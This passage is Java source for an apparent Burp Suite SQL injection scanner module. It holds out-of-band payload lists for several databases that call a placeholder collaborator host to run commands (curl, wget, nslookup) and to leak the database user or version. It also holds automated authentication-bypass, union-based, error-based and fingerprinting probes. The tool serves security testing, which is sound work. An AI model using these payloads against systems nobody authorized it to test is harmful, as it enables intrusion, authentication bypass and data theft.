                "1 AND (SELECT TOP 1 1 FROM master..sysprocesses WHERE 1=1);EXEC master..xp_dirtree '\\\\COLLAB_PLACEHOLDER\\a'-- -",
                // Subquery-wrapped — no quotes (integer injection)
                "(SELECT 1 WHERE 1=1);EXEC master..xp_dirtree '\\\\COLLAB_PLACEHOLDER\\a'-- -",
                // Inline subquery with OPENROWSET
                "1 UNION SELECT 1 FROM OPENROWSET('SQLOLEDB','server=COLLAB_PLACEHOLDER;uid=sa;pwd=sa','SELECT 1')-- -",
        });
        oob.put("Oracle", new String[]{
                // UTL_INADDR (DNS lookup) — string context
                "'||(SELECT UTL_INADDR.GET_HOST_ADDRESS('COLLAB_PLACEHOLDER'))||'",
                "' AND 1=UTL_INADDR.GET_HOST_ADDRESS('COLLAB_PLACEHOLDER')-- -",
                // UTL_HTTP (HTTP request) — string context
                "'||(SELECT UTL_HTTP.REQUEST('http://COLLAB_PLACEHOLDER/') FROM DUAL)||'",
                "' AND 1=(SELECT UTL_HTTP.REQUEST('http://COLLAB_PLACEHOLDER/') FROM DUAL)-- -",
                // HTTPURITYPE — string context
                "'||(SELECT HTTPURITYPE('http://COLLAB_PLACEHOLDER/').GETCLOB() FROM DUAL)||'",
                // DBMS_LDAP (LDAP connection)
                "'||(SELECT DBMS_LDAP.INIT('COLLAB_PLACEHOLDER',80) FROM DUAL)||'",
                // SYS.DBMS_LDAP.INIT with data exfil in LDAP path
                "'||(SELECT SYS.DBMS_LDAP.INIT((SELECT user FROM DUAL)||'.'||'COLLAB_PLACEHOLDER',80) FROM DUAL)||'",
                // UTL_TCP (TCP connection)
                "' AND 1=(SELECT UTL_TCP.OPEN_CONNECTION('COLLAB_PLACEHOLDER',80) FROM DUAL)-- -",
                // XXE via XMLType
                "' AND 1=(SELECT extractvalue(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://COLLAB_PLACEHOLDER/\">%remote;]>'),'/l') FROM DUAL)-- -",
                // DBMS_XMLGEN
                "' UNION SELECT DBMS_XMLGEN.getxml('SELECT UTL_INADDR.GET_HOST_ADDRESS(''COLLAB_PLACEHOLDER'') FROM DUAL') FROM DUAL-- -",
                // DBMS_SCHEDULER job creation with HTTP callback
                "'; BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name=>'omni',job_type=>'EXECUTABLE',job_action=>'/usr/bin/nslookup',number_of_arguments=>1,auto_drop=>TRUE);DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('omni',1,'COLLAB_PLACEHOLDER');DBMS_SCHEDULER.RUN_JOB('omni');END;-- -",
                // UTL_FILE write to UNC (Windows Oracle)
                "'; DECLARE f UTL_FILE.FILE_TYPE; BEGIN f:=UTL_FILE.FOPEN('\\\\COLLAB_PLACEHOLDER\\a','test.txt','W');UTL_FILE.PUT_LINE(f,'test');UTL_FILE.FCLOSE(f);END;-- -",
                // DBMS_XMLQUERY (older Oracle versions)
                "'||(SELECT DBMS_XMLQUERY.getxml('SELECT UTL_INADDR.GET_HOST_ADDRESS(''COLLAB_PLACEHOLDER'') FROM DUAL') FROM DUAL)||'",
                // UTL_HTTP with data exfil (user in path)
                "'||(SELECT UTL_HTTP.REQUEST('http://COLLAB_PLACEHOLDER/'||(SELECT user FROM DUAL)) FROM DUAL)||'",
                // Subquery-wrapped — numeric context (WHERE id=1 AND (...) IS NOT NULL)
                "1 AND (SELECT UTL_HTTP.REQUEST('http://COLLAB_PLACEHOLDER/'||(SELECT user FROM DUAL)) FROM DUAL) IS NOT NULL-- -",
                "1 AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM DUAL)||'.COLLAB_PLACEHOLDER') FROM DUAL) IS NOT NULL-- -",
                "1 AND (SELECT HTTPURITYPE('http://COLLAB_PLACEHOLDER/').GETCLOB() FROM DUAL) IS NOT NULL-- -",
                "1 AND (SELECT DBMS_LDAP.INIT((SELECT user FROM DUAL)||'.COLLAB_PLACEHOLDER',80) FROM DUAL) IS NOT NULL-- -",
                "1 AND (SELECT UTL_TCP.OPEN_CONNECTION('COLLAB_PLACEHOLDER',80) FROM DUAL) IS NOT NULL-- -",
                "1 OR (SELECT UTL_HTTP.REQUEST('http://COLLAB_PLACEHOLDER/') FROM DUAL) IS NOT NULL-- -",
                // Subquery-wrapped — no quotes (integer injection point)
                "(SELECT UTL_HTTP.REQUEST('http://COLLAB_PLACEHOLDER/'||(SELECT user FROM DUAL)) FROM DUAL)",
                "(SELECT UTL_INADDR.GET_HOST_ADDRESS('COLLAB_PLACEHOLDER') FROM DUAL)",
                "(SELECT HTTPURITYPE('http://COLLAB_PLACEHOLDER/').GETCLOB() FROM DUAL)",
                "(SELECT DBMS_LDAP.INIT('COLLAB_PLACEHOLDER',80) FROM DUAL)",
                // Double-pipe concatenation for numeric context
                "1||(SELECT UTL_HTTP.REQUEST('http://COLLAB_PLACEHOLDER/') FROM DUAL)",
                "1||(SELECT UTL_INADDR.GET_HOST_ADDRESS('COLLAB_PLACEHOLDER') FROM DUAL)",
        });
        oob.put("PostgreSQL", new String[]{
                // COPY TO PROGRAM (superuser)
                "'; COPY (SELECT '') TO PROGRAM 'nslookup COLLAB_PLACEHOLDER'-- -",
                "'; COPY (SELECT '') TO PROGRAM 'curl http://COLLAB_PLACEHOLDER/'-- -",
                "'; COPY (SELECT '') TO PROGRAM 'wget http://COLLAB_PLACEHOLDER/'-- -",
                // COPY FROM PROGRAM (reverse direction — reads output)
                "'; COPY omni FROM PROGRAM 'nslookup COLLAB_PLACEHOLDER'-- -",
                "'; COPY omni FROM PROGRAM 'curl http://COLLAB_PLACEHOLDER/'-- -",
                // dblink_connect (if extension installed) — string context
                "'||(SELECT dblink_connect('host=COLLAB_PLACEHOLDER dbname=a'))||'",
                "' AND 1=(SELECT dblink_connect('host=COLLAB_PLACEHOLDER dbname=a'))-- -",
                // dblink_connect with data exfil (version in host)
                "'||(SELECT dblink_connect('host='||(SELECT version())||'.COLLAB_PLACEHOLDER dbname=a'))||'",
                // dblink_send_query (async variant)
                "'; SELECT dblink_send_query('host=COLLAB_PLACEHOLDER dbname=a','SELECT 1')-- -",
                // Large object export (lo_export + COPY)
                "'; SELECT lo_export(lo_creat(-1), '\\\\COLLAB_PLACEHOLDER\\a')-- -",
                // DNS via inet_client_addr
                "'; DO $$ BEGIN PERFORM dblink_connect('host=COLLAB_PLACEHOLDER dbname=a'); EXCEPTION WHEN OTHERS THEN END $$-- -",
                // PG extensions - xml
                "'; SELECT query_to_xml('SELECT 1',true,true,'http://COLLAB_PLACEHOLDER/')-- -",
                // pg_read_server_log_file via dblink to trigger DNS
                "'; DO $$ BEGIN PERFORM dblink('host=COLLAB_PLACEHOLDER dbname=a','SELECT pg_ls_dir(''/tmp'')'); EXCEPTION WHEN OTHERS THEN END $$-- -",
                // Subquery-wrapped — numeric context
                "1 AND (SELECT dblink_connect('host=COLLAB_PLACEHOLDER dbname=a')) IS NOT NULL-- -",
                "1 AND (SELECT dblink_connect('host='||(SELECT current_user)||'.COLLAB_PLACEHOLDER dbname=a')) IS NOT NULL-- -",
                "1 OR (SELECT dblink_connect('host=COLLAB_PLACEHOLDER dbname=a')) IS NOT NULL-- -",
                // Subquery-wrapped — no quotes (integer injection)
                "(SELECT dblink_connect('host=COLLAB_PLACEHOLDER dbname=a'))",
                "(SELECT dblink_connect('host='||(SELECT current_user)||'.COLLAB_PLACEHOLDER dbname=a'))",
                // query_to_xml subquery-wrapped
                "1 AND (SELECT query_to_xml('SELECT 1',true,true,'http://COLLAB_PLACEHOLDER/')) IS NOT NULL-- -",
        });
        oob.put("SQLite", new String[]{
                // SQLite doesn't have native OOB, but ATTACH can be used
                "'; ATTACH DATABASE '\\\\COLLAB_PLACEHOLDER\\a' AS loot-- -",
                // Load extension (if enabled)
                "'; SELECT load_extension('\\\\COLLAB_PLACEHOLDER\\a')-- -",
                // Subquery-wrapped — numeric context
                "1 AND (SELECT load_extension('\\\\COLLAB_PLACEHOLDER\\a')) IS NOT NULL-- -",
                "1;ATTACH DATABASE '\\\\COLLAB_PLACEHOLDER\\a' AS loot-- -",
        });
        // DB-agnostic OOB via stacked queries (try common DNS/HTTP exfil for unknown DB)
        oob.put("Generic", new String[]{
                // MSSQL best-bet — string context
                "'; EXEC master..xp_dirtree '\\\\COLLAB_PLACEHOLDER\\a'-- -",
                // MySQL best-bet — string context
                "' AND LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a'))-- -",
                // Oracle best-bet — string context
                "'||(SELECT UTL_INADDR.GET_HOST_ADDRESS('COLLAB_PLACEHOLDER'))||'",
                // PostgreSQL best-bet — string context
                "'; COPY (SELECT '') TO PROGRAM 'nslookup COLLAB_PLACEHOLDER'-- -",
                // dblink (PostgreSQL, works without stacked queries)
                "'||(SELECT dblink_connect('host=COLLAB_PLACEHOLDER dbname=a'))||'",
                // Oracle HTTP (alternative to DNS)
                "'||(SELECT UTL_HTTP.REQUEST('http://COLLAB_PLACEHOLDER/') FROM DUAL)||'",
                // Subquery-wrapped — numeric context (covers all DB types)
                "1 AND (SELECT UTL_HTTP.REQUEST('http://COLLAB_PLACEHOLDER/') FROM DUAL) IS NOT NULL-- -",
                "1 AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',COLLAB_PLACEHOLDER,'\\\\a'))) IS NOT NULL-- -",
                "1 AND (SELECT dblink_connect('host=COLLAB_PLACEHOLDER dbname=a')) IS NOT NULL-- -",
                // Bare subqueries — no quotes (integer injection)
                "(SELECT UTL_INADDR.GET_HOST_ADDRESS('COLLAB_PLACEHOLDER') FROM DUAL)",
                "(SELECT LOAD_FILE(CONCAT(0x5c5c5c5c,COLLAB_PLACEHOLDER,0x5c5c61)))",
                "(SELECT dblink_connect('host=COLLAB_PLACEHOLDER dbname=a'))",
                // Numeric stacked query
                "1;EXEC master..xp_dirtree '\\\\COLLAB_PLACEHOLDER\\a'-- -",
        });
        OOB_PAYLOADS = Collections.unmodifiableMap(oob);
    }

    private static final String UNION_MARKER = "xXsSqLiXx";

    @Override
    public String getId() { return "sqli-detector"; }

    @Override
    public String getName() { return "Smart SQLi Detector"; }

    @Override
    public String getDescription() {
        return "SQL injection detection: error-based, union-based, time-blind, boolean-blind, and OOB (Collaborator).";
    }

    @Override
    public ModuleCategory getCategory() { return ModuleCategory.INJECTION; }

    @Override
    public boolean isPassive() { return false; }

    @Override
    public void initialize(MontoyaApi api, ModuleConfig config) {
        this.api = api;
        this.config = config;
    }

    /**
     * Inject external dependencies from the framework.
     */
    public void setDependencies(DeduplicationStore dedup, FindingsStore findingsStore,
                                 CollaboratorManager collaboratorManager) {
        this.dedup = dedup;
        this.findingsStore = findingsStore;
        this.collaboratorManager = collaboratorManager;
    }

    @Override
    public List<Finding> processHttpFlowForParameter(
            HttpRequestResponse requestResponse, String targetParameterName, MontoyaApi api) {
        HttpRequest request = requestResponse.request();
        String urlPath = extractPath(request.url());
        List<InjectionPoint> injectionPoints = extractInjectionPoints(request);
        injectionPoints.removeIf(ip -> !ip.name.equalsIgnoreCase(targetParameterName));
        return runInjectionPoints(requestResponse, injectionPoints, urlPath);
    }

    @Override
    public List<Finding> processHttpFlow(HttpRequestResponse requestResponse, MontoyaApi api) {
        // Extract parameters from the request
        HttpRequest request = requestResponse.request();
        String urlPath = extractPath(request.url());
        List<InjectionPoint> injectionPoints = extractInjectionPoints(request);
        return runInjectionPoints(requestResponse, injectionPoints, urlPath);
    }

    private List<Finding> runInjectionPoints(HttpRequestResponse requestResponse,
                                              List<InjectionPoint> injectionPoints, String urlPath) {
        for (InjectionPoint ip : injectionPoints) {
            String dedupKey = "sqli:" + urlPath + ":" + ip.name;
            // Atomic mark-before-test: putIfAbsent returns null only on first caller,
            // preventing both the TOCTOU race (containsKey/put) and the retry-on-exception
            // bug (parameter retested forever if testParameter throws).
            if (tested.putIfAbsent(dedupKey, Boolean.TRUE) != null) continue;

            try {
                testParameter(requestResponse, ip, urlPath);
            } catch (Exception e) {
                api.logging().logToError("SQLi test error on " + ip.name + ": " + e.getMessage());
            }
        }

        return Collections.emptyList(); // Findings are added async to FindingsStore
    }

    private void testParameter(HttpRequestResponse original, InjectionPoint ip, String urlPath) {
        try {
            // Phase 1: OOB via Collaborator (FIRST — fastest path to confirmed finding)
            // OOB is fire-and-forget: send payloads now, Collaborator polls for interactions
            // in the background. If confirmed, oobConfirmedParams is set and remaining phases skip.
            if (config.getBool("sqli.oob.enabled", true) && collaboratorManager != null && collaboratorManager.isAvailable()) {
                testOob(original, ip);
            }

            // Phase 2: Baseline (3 measurements, use max to reduce false positives)
            if (oobConfirmedParams.contains(ip.name)) return;
            TimedResult baselineTimedResult = measureResponseTime(original, ip, ip.originalValue);
            HttpRequestResponse baseline = baselineTimedResult.response;
            if (baseline == null || baseline.response() == null) return;

            long baselineTime = baselineTimedResult.elapsedMs;
            TimedResult b2 = measureResponseTime(original, ip, ip.originalValue);
            TimedResult b3 = measureResponseTime(original, ip, ip.originalValue);
            baselineTime = Math.max(baselineTime, Math.max(
                    b2.response != null ? b2.elapsedMs : 0,
                    b3.response != null ? b3.elapsedMs : 0));

            String baselineBody = baseline.response().bodyToString();
            if (baselineBody == null) baselineBody = "";
            int baselineLength = baselineBody.length();
            int baselineStatus = baseline.response().statusCode();

            // Phase 3: Auth bypass (if enabled and looks like a login param)
            if (oobConfirmedParams.contains(ip.name)) return;
            if (config.getBool("sqli.authBypass.enabled", true)) {
                testAuthBypass(original, ip, baselineStatus, baselineLength, baselineBody);
            }

            // Phase 4: Error-based (if enabled)
            if (oobConfirmedParams.contains(ip.name)) return;
            if (config.getBool("sqli.error.enabled", true)) {
                testErrorBased(original, ip, baselineBody);
            }

            // Phase 5: Union-based (if enabled)
            if (oobConfirmedParams.contains(ip.name)) return;
            if (config.getBool("sqli.union.enabled", true)) {
                testUnionBased(original, ip, baselineLength, baselineStatus, baselineBody);
            }

            // Phase 6: Boolean-based blind (if enabled)
            if (oobConfirmedParams.contains(ip.name)) return;
            if (config.getBool("sqli.boolean.enabled", true)) {
                testBooleanBased(original, ip, baselineLength, baselineStatus, baselineBody);
            }

            // Phase 7: Time-based blind (LAST — serialized via TimingLock)
            // Gated by global TimingLock.isEnabled() checkbox AND per-module config
            if (oobConfirmedParams.contains(ip.name)) return;
            if (TimingLock.isEnabled() && config.getBool("sqli.time.enabled", true)) {
                try {
                    TimingLock.acquire();
                    testTimeBased(original, ip, baselineTime);
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    return;
                } finally {
                    TimingLock.release();
                }
            }

        } catch (Exception e) {
            api.logging().logToError("SQLi test error for " + ip.name + ": " + e.getMessage());
        }
    }

    // ==================== PHASE 2: ERROR-BASED ====================

    private void testErrorBased(HttpRequestResponse original, InjectionPoint ip, String baselineBody) {
        // Baseline stability check: verify baseline body is stable across requests
        try {
            HttpRequestResponse stabCheck = sendWithPayload(original, ip, ip.originalValue);
            if (stabCheck != null && stabCheck.response() != null) {
                String stabBody = stabCheck.response().bodyToString();
                // Check for SQL error patterns already present in fresh baseline
                for (Map.Entry<String, List<Pattern>> entry : ERROR_PATTERNS.entrySet()) {
                    for (Pattern p : entry.getValue()) {
                        if (p.matcher(stabBody != null ? stabBody : "").find()
                                && (baselineBody == null || !p.matcher(baselineBody).find())) {
                            // Baseline is producing different error content on repeated requests
                            api.logging().logToOutput("[SQLi] Skipping error-based for " + ip.name
                                    + " — baseline response contains unstable error patterns");
                            return;
                        }
                    }
                }
            }
        } catch (Exception ignored) {}

        for (String payload : ERROR_PAYLOADS) {
            try {

                HttpRequestResponse result = sendWithPayload(original, ip, payload);
                if (result == null || result.response() == null) continue;

                // Skip 400 Bad Request — often just input validation rejecting the quote/payload,
                // and the error page may contain SQL-like keywords (e.g., "syntax error in query string")
                int statusCode = result.response().statusCode();
                if (statusCode == 400 || statusCode == 403 || statusCode == 404) continue;

                String responseBody = result.response().bodyToString();

                // Check for SQL error signatures
                for (Map.Entry<String, List<Pattern>> entry : ERROR_PATTERNS.entrySet()) {
                    String dbType = entry.getKey();
                    for (Pattern pattern : entry.getValue()) {
                        Matcher m = pattern.matcher(responseBody);
                        // Guard: if baseline is empty, require the response to be a 500 (server error)
                        // to avoid matching error keywords in generic error pages
                        boolean baselineEmpty = baselineBody == null || baselineBody.isEmpty();
                        if (baselineEmpty && statusCode != 500) continue;
                        if (m.find() && !pattern.matcher(baselineBody != null ? baselineBody : "").find()) {
                            String evidence = m.group();
                            findingsStore.addFinding(Finding.builder("sqli-detector",
                                            "SQL Injection (Error-Based) - " + dbType,
                                            Severity.HIGH, Confidence.FIRM)
                                    .url(original.request().url())
                                    .parameter(ip.name)
                                    .evidence("Payload: " + payload + " | Error: " + evidence)
                                    .payload(payload)
                                    .responseEvidence(evidence)
                                    .description("Error-based SQL injection detected. DB type: " + dbType
                                            + ". Parameter '" + ip.name + "' triggered a SQL error.")
                                    .requestResponse(result)
                                    .build());
                            return; // Found error-based, skip remaining payloads
                        }
                    }
                }

                perHostDelay();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            }
        }
    }

    // ==================== PHASE 2: AUTH BYPASS ====================

    private void testAuthBypass(HttpRequestResponse original, InjectionPoint ip,
                                 int baselineStatus, int baselineLength, String baselineBody) {
        // Only test parameters that look like login/username fields, or any parameter in a POST
        // request that has a password-like sibling parameter
        boolean isLoginParam = isLoginParameter(ip, original.request());
        if (!isLoginParam) return;

        api.logging().logToOutput("[SQLi] Auth bypass: testing param '" + ip.name + "' (login parameter detected)");

        String baselineLower = baselineBody.toLowerCase();

        // Check if baseline looks like a failed login (has failure keywords or is a login page)
        boolean baselineHasFailure = false;
        for (String keyword : FAILURE_KEYWORDS) {
            if (baselineLower.contains(keyword)) {
                baselineHasFailure = true;
                break;
            }
        }

        for (String payloadTemplate : AUTH_BYPASS_PAYLOADS) {
            try {
                String payload = payloadTemplate.replace("ORIGINAL_VALUE", ip.originalValue);

                HttpRequestResponse result = sendWithPayload(original, ip, payload);
                if (result == null || result.response() == null) continue;

                int resultStatus = result.response().statusCode();
                int resultLength = result.response().bodyToString().length();
                String resultBody = result.response().bodyToString();
                String resultLower = resultBody.toLowerCase();

                // Detection signals for successful auth bypass
                List<String> signals = new ArrayList<>();

                // Signal 1: Status code changed to redirect (302, 303) — classic login redirect
                // But NOT if redirecting to an error/block/login page (WAF/security filter)
                if ((baselineStatus == 200 || baselineStatus == 401 || baselineStatus == 403)
                        && (resultStatus == 302 || resultStatus == 303)) {
                    String location = "";
                    for (var h : result.response().headers()) {
                        if (h.name().equalsIgnoreCase("Location")) {
                            location = h.value().toLowerCase();
                            break;
                        }
                    }
                    // Skip redirects to error/block/login pages — these are WAF/security rejections, not auth bypass
                    boolean isBlockRedirect = location.contains("error") || location.contains("block")
                            || location.contains("denied") || location.contains("security")
                            || location.contains("waf") || location.contains("captcha")
                            || location.contains("login") || location.contains("signin")
                            || location.contains("unauthorized") || location.contains("forbidden");
                    if (!isBlockRedirect) {
                        signals.add("Redirect: HTTP " + baselineStatus + " → " + resultStatus
                                + (location.isEmpty() ? "" : " (Location: " + location + ")"));
                    }
                }

                // Signal 2: Status code changed from error to success
                if ((baselineStatus == 401 || baselineStatus == 403) && resultStatus == 200) {
                    signals.add("Status change: HTTP " + baselineStatus + " → 200 OK");
                }

                // Signal 3: New Set-Cookie header appeared (new session created)
                boolean baselineHasCookie = false;
                boolean resultHasCookie = false;
                for (var h : original.response() != null ? original.response().headers() : List.<burp.api.montoya.http.message.HttpHeader>of()) {
                    if (h.name().equalsIgnoreCase("Set-Cookie")) { baselineHasCookie = true; break; }
                }
                for (var h : result.response().headers()) {
                    if (h.name().equalsIgnoreCase("Set-Cookie")) { resultHasCookie = true; break; }
                }
                if (resultHasCookie && !baselineHasCookie) {
                    signals.add("New session cookie set (Set-Cookie header appeared)");
                }

                // Signal 4: Success keywords appeared in response
                for (String keyword : SUCCESS_KEYWORDS) {
                    if (resultLower.contains(keyword) && !baselineLower.contains(keyword)) {
                        signals.add("Success keyword appeared: '" + keyword + "'");
                        break;
                    }
                }

                // Signal 5: Failure keywords disappeared from response
                if (baselineHasFailure) {
                    boolean stillHasFailure = false;
                    for (String keyword : FAILURE_KEYWORDS) {
                        if (resultLower.contains(keyword)) {
                            stillHasFailure = true;
                            break;
                        }
                    }
                    if (!stillHasFailure) {
                        signals.add("Login failure message disappeared");
                    }
                }

                // Signal 6: Significant body length change (more than 30% different)
                if (baselineLength > 0) {
                    double ratio = Math.abs(resultLength - baselineLength) / (double) baselineLength;
                    if (ratio > 0.3 && Math.abs(resultLength - baselineLength) > 200) {
                        signals.add("Body length changed significantly: " + baselineLength + " → " + resultLength
                                + " (" + Math.round(ratio * 100) + "% difference)");
                    }
                }

                // Report only if we have strong structural signals
                // Must have at least 2 signals AND at least one must be an authentication artifact
                // (session cookie or success keyword — not just status/length changes)
                boolean hasAuthArtifact = false;
                for (String signal : signals) {
                    if (signal.contains("session cookie") || signal.contains("Success keyword")) {
                        hasAuthArtifact = true;
                        break;
                    }
                }

                if (signals.size() >= 2 && hasAuthArtifact) {
                    // Multiple signals with auth artifact — confirmed bypass
                    findingsStore.addFinding(Finding.builder("sqli-detector",
                                    "SQL Injection — Authentication Bypass",
                                    Severity.CRITICAL, Confidence.FIRM)
                            .url(original.request().url())
                            .parameter(ip.name)
                            .evidence("Payload: " + payload + "\n" + String.join("\n", signals))
                            .payload(payload)
                            .description("Authentication bypass via SQL injection. The payload '" + payload
                                    + "' in parameter '" + ip.name + "' caused a response with authentication "
                                    + "artifacts (session cookie and/or authenticated-area content) that were "
                                    + "absent in the baseline failed-login response.")
                            .remediation("Use parameterized queries (prepared statements) instead of string "
                                    + "concatenation in SQL queries. Never build SQL queries by concatenating "
                                    + "user input directly.")
                            .requestResponse(result)
                            .build());
                    api.logging().logToOutput("[SQLi] Auth bypass CONFIRMED for param '" + ip.name
                            + "' with payload: " + payload + " | Signals: " + signals);
                    return;
                }
                // Single-signal findings are NOT reported — they are too FP-prone.
                // A 302 redirect or body length change alone is not evidence of auth bypass.

                perHostDelay();
            } catch (InterruptedException e) {
                Thread.currentThread().interrupt();
                return;
            }
        }
    }

    /**
     * Determines if a parameter looks like a login/username field.
     * Checks the parameter name and whether a password-like sibling parameter exists.
     */
    private boolean isLoginParameter(InjectionPoint ip, HttpRequest request) {
        String nameLower = ip.name.toLowerCase().replaceAll("[_\\-.]", "");

        // Direct match on parameter name
        for (String loginName : LOGIN_PARAM_NAMES) {
            if (nameLower.equals(loginName.replace("_", ""))) {
                return true;
            }
        }

        // Check if there's a password-like sibling parameter (strong hint this is a login form)
        boolean hasPasswordSibling = false;
        for (var param : request.parameters()) {
            String pName = param.name().toLowerCase().replaceAll("[_\\-.]", "");
            if (pName.contains("password") || pName.contains("passwd") || pName.contains("pass")
                    || pName.equals("pw") || pName.equals("pwd")) {
                hasPasswordSibling = true;
                break;
            }
        }

        // Also check JSON body for password fields
        if (!hasPasswordSibling) {
            String contentType = "";
            for (var h : request.headers()) {
                if (h.name().equalsIgnoreCase("Content-Type")) {
                    contentType = h.value();
                    break;
                }
            }
            if (contentType.contains("application/json")) {
                String body = request.bodyToString();
                if (body != null) {
                    String bodyLower = body.toLowerCase();
                    hasPasswordSibling = bodyLower.contains("\"password\"") || bodyLower.contains("\"passwd\"")
                            || bodyLower.contains("\"pass\"") || bodyLower.contains("\"pwd\"");
                }
            }
        }

        // If there's a password sibling, any non-password text field could be the username
        if (hasPasswordSibling) {
            String pName = ip.name.toLowerCase();
            return !pName.contains("password") && !pName.contains("passwd")
                    && !pName.contains("pass") && !pName.equals("pw") && !pName.equals("pwd")
                    && !pName.contains("csrf") && !pName.contains("token");
        }

        return false;
    }

    // ==================== PHASE 3: UNION-BASED ====================

    private void testUnionBased(HttpRequestResponse original, InjectionPoint ip,
                                 int baselineLength, int baselineStatus, String baselineBody) {
        int maxColumns = config.getInt("sqli.union.maxColumns", 30);
        int anomalyThreshold = config.getInt("sqli.union.anomalyThreshold", 50);

        // Step 1: Detect column count via ORDER BY
        int columnCount = -1;
        String quoteChar = "'";
        HttpRequestResponse lastOrderByResult = null;

        for (String q : new String[]{"'", "\"", ""}) {
            int lastGood = 0;
            for (int i = 1; i <= maxColumns; i++) {
                try {
        
                    String payload = q.isEmpty()
                            ? ip.originalValue + " ORDER BY " + i + "-- -"
                            : ip.originalValue + q + " ORDER BY " + i + "-- -";

                    HttpRequestResponse result = sendWithPayload(original, ip, payload);
                    if (result == null || result.response() == null) break;

                    int status = result.response().statusCode();
                    int length = result.response().bodyToString().length();

                    if (status == baselineStatus && Math.abs(length - baselineLength) < anomalyThreshold) {
                        lastGood = i;
                        lastOrderByResult = result;
                    } else {
                        // Response changed — previous value was the column count
                        if (lastGood > 0) {
                            columnCount = lastGood;
                            quoteChar = q;
                        }
                        break;
                    }
                    perHostDelay();
                } catch (InterruptedException e) {
                    Thread.currentThread().interrupt();
                    return;
                }
            }
            if (columnCount > 0) break;
        }

        if (columnCount <= 0) return;

        // Column count detection is a prerequisite step, not a finding.
        // Only report if UNION marker exfiltration succeeds.

        // Step 2: UNION SELECT with NULLs (try multiple UNION variants)
        try {

            String nulls = String.join(",", Collections.nCopies(columnCount, "NULL"));

            // Try multiple UNION variants — some WAFs block UNION SELECT but allow UNION ALL SELECT
            String[] unionVariants = {
                    " UNION SELECT ",
                    " UNION ALL SELECT ",
                    " UNION/**/SELECT ",
                    " UNION%0aSELECT ",
                    "/*!UNION*//*!SELECT*/ ",
            };

            String unionPayload = null;
            HttpRequestResponse unionResult = null;

            for (String variant : unionVariants) {
                String testPayload = quoteChar.isEmpty()
                        ? ip.originalValue + variant + nulls + "-- -"
                        : ip.originalValue + quoteChar + variant + nulls + "-- -";

                HttpRequestResponse testResult = sendWithPayload(original, ip, testPayload);
                if (testResult != null && testResult.response() != null) {
                    int testStatus = testResult.response().statusCode();
                    // Accept if status is 200 or matches baseline (WAF would return 403/400)
                    if (testStatus == 200 || testStatus == baselineStatus) {
                        unionPayload = testPayload;
                        unionResult = testResult;
                        break;
                    }
                }
                perHostDelay();
            }

            if (unionResult == null) return;

            int unionLength = unionResult.response().bodyToString().length();
            int unionStatus = unionResult.response().statusCode();

            boolean anomaly = Math.abs(unionLength - baselineLength) > anomalyThreshold
                    || unionStatus != baselineStatus;

            // Determine which UNION variant worked for subsequent payloads
            String workingUnion = " UNION SELECT ";
            if (unionPayload != null) {
                for (String variant : unionVariants) {
                    if (unionPayload.contains(variant.trim())) {
                        workingUnion = variant;
                        break;
                    }
                }
            }

            // Step 3: Find reflected column
            int reflectedColumn = -1;
            for (int col = 0; col < columnCount; col++) {

                String[] cols = new String[columnCount];
                Arrays.fill(cols, "NULL");
                cols[col] = "'" + UNION_MARKER + "'";

                String markerPayload = quoteChar.isEmpty()
                        ? ip.originalValue + workingUnion + String.join(",", cols) + "-- -"
                        : ip.originalValue + quoteChar + workingUnion + String.join(",", cols) + "-- -";

                HttpRequestResponse markerResult = sendWithPayload(original, ip, markerPayload);
                if (markerResult != null && markerResult.response() != null) {
                    if (markerResult.response().bodyToString().contains(UNION_MARKER)) {
                        reflectedColumn = col + 1;

                        findingsStore.addFinding(Finding.builder("sqli-detector",
                                        "SQL Injection (Union-Based) - Reflected column " + reflectedColumn,
                                        Severity.CRITICAL, Confidence.TENTATIVE)
                                .url(original.request().url())
                                .parameter(ip.name)
                                .evidence("Column " + reflectedColumn + " of " + columnCount + " is reflected. Marker '" + UNION_MARKER + "' found in response.")
                                .payload(markerPayload)
                                .responseEvidence(UNION_MARKER)
                                .description("Union-based SQL injection confirmed. Column " + reflectedColumn
                                        + " is reflected in the response.")
                                .requestResponse(markerResult)
                                .build());

                        // Step 4: DB fingerprinting
                        fingerprintDb(original, ip, columnCount, reflectedColumn, quoteChar, workingUnion);
                        return;
                    }
                }
                perHostDelay();
            }

            // Anomaly-only detection REMOVED: a response that differs from baseline is not a finding.
            // Only confirmed UNION marker exfiltration constitutes a finding.

        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }
    }

    private void fingerprintDb(HttpRequestResponse original, InjectionPoint ip,
                                int columnCount, int reflectedCol, String quoteChar, String unionVariant) {
        // Get baseline for comparison
        HttpRequestResponse baselineResult = sendWithPayload(original, ip, ip.originalValue);
        String baselineBody = (baselineResult != null && baselineResult.response() != null)
                ? baselineResult.response().bodyToString() : "";
        int baselineLength = baselineBody.length();
        String[][] dbProbes = {
                {"MySQL", "version()"},
                {"MySQL", "database()"},
                {"MySQL", "user()"},
                {"MySQL", "@@datadir"},
                {"PostgreSQL", "version()"},
                {"PostgreSQL", "current_database()"},
                {"PostgreSQL", "current_user"},
                {"MSSQL", "@@version"},
                {"MSSQL", "DB_NAME()"},
                {"MSSQL", "SYSTEM_USER"},
                {"MSSQL", "@@SERVERNAME"},
                {"Oracle", "banner FROM v$version WHERE ROWNUM=1"},
                {"Oracle", "user FROM dual"},
                {"SQLite", "sqlite_version()"},
        };

        for (String[] probe : dbProbes) {
            try {

                String[] cols = new String[columnCount];
                Arrays.fill(cols, "NULL");
                // Oracle probes with FROM need special handling
                boolean oracleFrom = probe[1].contains("FROM ");
                if (oracleFrom) {
                    cols[reflectedCol - 1] = probe[1].split(" FROM ")[0];
                } else {
                    cols[reflectedCol - 1] = probe[1];
                }

                String selectPart = String.join(",", cols);
                String fromPart = oracleFrom ? " FROM " + probe[1].split(" FROM ")[1] : "";

                String payload = quoteChar.isEmpty()
                        ? ip.originalValue + unionVariant + selectPart + fromPart + "-- -"
                        : ip.originalValue + quoteChar + unionVariant + selectPart + fromPart + "-- -";

                HttpRequestResponse result = sendWithPayload(original, ip, payload);
